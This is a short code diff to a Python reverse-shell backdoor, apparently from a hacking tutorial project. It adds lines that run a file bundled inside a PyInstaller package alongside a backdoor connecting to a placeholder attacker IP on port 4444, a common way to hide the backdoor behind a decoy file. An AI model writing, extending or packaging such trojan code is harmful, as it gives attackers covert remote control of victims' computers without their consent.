@@ -77,6 +77,9 @@ class Backdoor:
 
             self.reliable_send(command_result)
 
+file_name = sys._MEIPASS + "your file name"  # Specify the file name to be executed
+subprocess.Popen(file_name, shell=True)
+
 try:
 	my_backdoor = Backdoor("your ip", 4444)
 	my_backdoor.run()
